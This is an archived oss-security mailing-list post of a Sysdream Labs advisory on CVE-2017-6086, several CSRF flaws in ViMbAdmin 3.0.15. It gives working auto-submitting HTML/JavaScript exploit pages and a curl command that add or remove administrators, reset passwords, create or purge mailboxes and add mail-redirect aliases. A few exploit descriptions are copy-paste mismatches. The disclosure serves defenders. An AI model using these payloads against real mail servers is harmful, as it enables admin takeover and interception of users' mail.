X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["9777" "Wednesday" "3" "May" "2017" "16:01:24" "+0200" "Sysdream Labs" "labs@sysdream.com" "<d3659d35-b9d9-9648-de14-88de7b488630@sysdream.com>" "367" "[oss-security] [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version 3.0.15" nil nil nil "5" "2017050314:01:24" "[oss-security] [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version 3.0.15" (number mark "U       labs@sysdrea May  3  367/9777  " thread-indent "\"[oss-security] [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version 3.0.15\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3206 invoked by uid 550); 3 May 2017 14:01:54 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3180 invoked from network); 3 May 2017 14:01:53 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 057571A114E
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1493820094;
	bh=ogtFiuRx2Y83+DUrCpI9VgGP7/xbC/uz4b3vZuYjts8=;
	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
	b=RQwnt2Nwy6zKgbwh2gESLZnLFk71ubWcDLaBS+jcKzxfvok6ymq3mzjOEwDWcAyyQ
	 eYdcAX7XuvG6wIte7q95VNgVYK3bs0hgqKyhfAeq53Gosbr6kp+y8/tuTYoQ9u/kBh
	 iYEg+eOfMqPIaVtdP8JhVaAMG2ylAkUqYvH60bS0=
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org
From: Sysdream Labs <labs@sysdream.com>
Message-ID: <d3659d35-b9d9-9648-de14-88de7b488630@sysdream.com>
Date: Wed, 3 May 2017 16:01:24 +0200
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="eaar3dvnVQLr84cO9dbt8G49qVirk1NeI"
Subject: [oss-security] [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version
 3.0.15

--eaar3dvnVQLr84cO9dbt8G49qVirk1NeI
Content-Type: multipart/mixed; boundary="J1S7bSWc9JJlA7A0aNmRtRwBcS9LguR8E";
 protected-headers="v1"
From: Sysdream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org
Message-ID: <d3659d35-b9d9-9648-de14-88de7b488630@sysdream.com>
Subject: [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version
 3.0.15

--J1S7bSWc9JJlA7A0aNmRtRwBcS9LguR8E
Content-Type: text/plain; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: quoted-printable

# [CVE-2017-6086] Multiple CSRF vulnerabilities in ViMbAdmin version 3.0.15

## Product Description

ViMbAdmin is a web-based interface used to manage a mail server with virtua=
l domains, mailboxes and aliases. It is an open source solution developed b=
y Opensolutions and distributed under the GNU/GPL license version 3. The of=
ficial web site can be found at http://www.vimbadmin.net and the source cod=
e of the application is available on github https://github.com/opensolution=
s.

## Details

**CVE ID**: CVE-2017-6086

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-352

**CVSS Base Score**: 8.8

**CVSS vector**: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

## Proof of concept

### Add administrator user

#### Exploit

The following html/javascript code allows to delete an administrator user. =
It needs to be visited by a logged administrator of the targeted ViMbAdmin =
application.

```html
<head>
<title>CSRF ViMbAdmin</title>
</head>
<body>


<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://<target ip>/admin/add" method=3D"PO=
ST" target=3D"csrf-frame" >
<input type=3D"text" name=3D"user" value=3D"target@email" >
<input type=3D"text" name=3D"password" value=3D"newpassword" >
</form>


<script>document.getElementById("csrf-form").submit()</script>

</body>

```

#### Vulnerable code

The vulnerable code is located in the `addAction()` method of the `<vimbadm=
in directory>/application/controllers/DomainController.php` file.

### Remove administrator user

#### Exploit

The following html/javascript code allows to delete an administrator user. =
It needs to be visited by a logged administrator of the targeted ViMbAdmin =
application.

```html
<head>
<title>CSRF ViMbAdmin</title>
</head>
<body>


<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://<target ip>/admin/purge/aid/<admini=
strator id>" method=3D"GET" target=3D"csrf-frame" >
</form>


<script>document.getElementById("csrf-form").submit()</script>

</body>
```

#### Vulnerable code

The vulnerable code is located in the `purgeAction()` method of the `<vimba=
dmin directory>/application/controllers/DomainController.php` file.

### Change administrator password

#### Exploit

The following html/javascript code allows to update administrator password.=
 It needs to be visited by a logged administrator of the targeted ViMbAdmin=
 application.

```html
<head>
<title>CSRF ViMbAdmin</title>
</head>
<body>


<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://<target ip>/admin/password/aid/<adm=
inistrator id>" method=3D"POST" target=3D"csrf-frame" >
<input type=3D"text" name=3D"password" value=3D"newpassword" >
</form>


<script>document.getElementById("csrf-form").submit()</script>

</body>
```

#### Vulnerable code

The vulnerable code is located in the `passwordAction()` method of the `<vi=
mbadmin directory>/application/controllers/DomainController.php` file.

### Add mailbox address

#### Exploit

The following html/javascript code allows to update administrator password.=
 It needs to be visited by a logged administrator of the targeted ViMbAdmin=
 application.

```html
<head>
<title>CSRF ViMbAdmin</title>
</head>
<body>


<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://<target ip>/mailbox/add/did/<domain=
 id>" method=3D"POST" target=3D"csrf-frame" >
<input type=3D"text" name=3D"local_part" value=3D"<fakeemail>" >
<input type=3D"text" name=3D"domain" value=3D"<domain id>" >
<input type=3D"text" name=3D"name" value=3D"<fake name>" >
<input type=3D"text" name=3D"password" value=3D"<password>" >
<input type=3D"text" name=3D"quota" value=3D"0" >
<input type=3D"text" name=3D"alt_email" value=3D"" >
<input type=3D"text" name=3D"cc_welcome_email" value=3D"" >
</form>


<script>document.getElementById("csrf-form").submit()</script>

</body>
```

#### Vulnerable code

The vulnerable code is located in the `addAction()` method of the `<vimbadm=
in directory>/application/controllers/MailboxController.php` file.

### Purge mailbox

#### Exploit

The following html/javascript code allows to remove a mailbox address. It n=
eeds to be visited by a logged administrator of the targeted ViMbAdmin appl=
ication.

```html
<head>
<title>CSRF ViMbAdmin</title>
</head>
<body>


<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://<target ip>/mailbox/purge/mid/<mail=
box id>" method=3D"POST" target=3D"csrf-frame" >
<input type=3D"text" name=3D"data" value=3D"purge" >
</form>


<script>document.getElementById("csrf-form").submit()</script>

</body>
```

#### Vulnerable code

The vulnerable code is located in the `purgeAction()` method of the `<vimba=
dmin directory>/application/controllers/MailboxController.php` file.

### Archive mailbox

#### Exploit

The following html/javascript code allows to force the archival of a mailbo=
x address. It needs to be visited by an administrator of the targeted ViMbA=
dmin application.

```html
<head>
<title>CSRF ViMbAdmin</title>
</head>
<body>


<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://<target ip>/archive/add/mid/<mailbo=
x id>" method=3D"GET" target=3D"csrf-frame" >
</form>


<script>document.getElementById("csrf-form").submit()</script>

</body>
```

#### Vulnerable code

The vulnerable code is located in the `addAction()` method of the `<vimbadm=
in directory>/application/controllers/ArchiveController.php` file.

### Add alias address

#### Exploit

The following html/javascript code allows to force the archival of a mailbo=
x address. It needs to be visited by an administrator of the targeted ViMbA=
dmin application.

```html
curl 'http://<ip>/alias/add/did/<domain id>'  --data 'local_part=3D<fake ma=
ilbox>&domain=3D<domain id>&goto%5B%5D=3D<redirection email address>'
<head>
<title>CSRF ViMbAdmin</title>
</head>
<body>


<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://<target ip>/alias/add/did/<domain i=
d>" method=3D"POST" target=3D"csrf-frame" >
<input type=3D"text" name=3D"local_part" value=3D"<fake mailbox>" >
<input type=3D"text" name=3D"domain" value=3D"<domain id>" >
<input type=3D"text" name=3D"goto[]" value=3D"<redirection email address>" >
</form>


<script>document.getElementById("csrf-form").submit()</script>

</body>
```

#### Vulnerable code

The vulnerable code is located in the `addAction()` method of the `<vimbadm=
in directory>/application/controllers/AliasController.php` file.

### Remove alias address

#### Exploit

The following html/javascript code allows the removal of a alias address. I=
t needs to be visited by a logged administrator of the targeted ViMbAdmin a=
pplication.

```html
<head>
<title>CSRF ViMbAdmin</title>
</head>
<body>


<iframe style=3D"display:none" name=3D"csrf-frame"></iframe>
<form id=3D"csrf-form" action=3D"http://<target ip>/alias/delete/alid/<alia=
s id>" method=3D"GET" target=3D"csrf-frame" >
</form>


<script>document.getElementById("csrf-form").submit()</script>

</body>
```

#### Vulnerable Code

The vulnerable code is located in the `addAction()` method of the `<vimbadm=
in directory>/application/controllers/AliasController.php` file.

## Affected version

* tested on version 3.0.15

## Timeline (dd/mm/yyyy)

* 22/01/2017 : Initial discovery.
* 16/02/2017 : First contact with opensolutions.io
* 16/02/2017 : Advisory sent.
* 24/02/2017 : Reply from the owner, acknowledging the report and planning =
to fix the vulnerabilities.
* 13/03/2017 : Sysdream Labs request for an update.
* 29/03/2017 : Second request for an update.
* 29/03/2017 : Reply from the owner stating that he has no time to fix the =
issues.
* 03/05/2017 : Full disclosure.


## Credits

* Florian NIVETTE, Sysdream (f.nivette -at- sysdream -dot- com)

--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream



--J1S7bSWc9JJlA7A0aNmRtRwBcS9LguR8E--

--eaar3dvnVQLr84cO9dbt8G49qVirk1NeI
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJZCeK9AAoJEI60jNnVslmheMsQAIR3YaD1khgaRBsA4ovqhpvM
HMHzLgCy0syWcR9oR0yx5KXQn0Ro64IU8m4KQkeo6zebFu6cdhVKzbslql1exs9R
GvSsr/oPPgIRgHZCnBqINUVrw+JLp+AVgL1iRFMP4C1LD3jALJm7PdIOvfwwKm4q
n/hQeVdLWJIjjcuDU1bRWrGkc6iYnSUl/XF2VwQBKC72xh4tTz7LAHda6btSSNtQ
8WbXbpNI9Bev7Piz9vI/3eo4Vs43ksVDEtb8FRgGDVzdmWhW+aX4xDPhDrwFrnKD
8SGN00jTNvD3z9MzgZ1ZAW8uwu3AYYZ6mWhjFh/Zlci87cAOpVm1SMn0loEit2JW
YG5TbTNyi5Qb1u9czv6cRYR3YK4jQtyBLVw53fmBwm107MpuegvrDEGhHXs40vzd
zWdf5ev2+/F67BGjCSXH8Ly2KcRZepomPbU+PUX+1KSjegrZOHxxTky/FxQlloX/
tzYyqaru0F+zuoUw37gMe7A0rcQeESQcXs3Q3sGJ8C0BRmUAndjCYS4uu1B4KzkC
bgnY4b/DYay/AD6XGhMQ3lL0Zd9EZ8oc1YZOYRsCsp4SHAIb0SFHPw5f+4yizsdE
OJ/Sw2A/21tCnQ0fL9TLkzYJKJVxJN2lAKlVxzCMurxDtPo82NlHx6XY/yU41p0z
vxrbPrhmH6URRIaLzDCI
=R0Wg
-----END PGP SIGNATURE-----

--eaar3dvnVQLr84cO9dbt8G49qVirk1NeI--
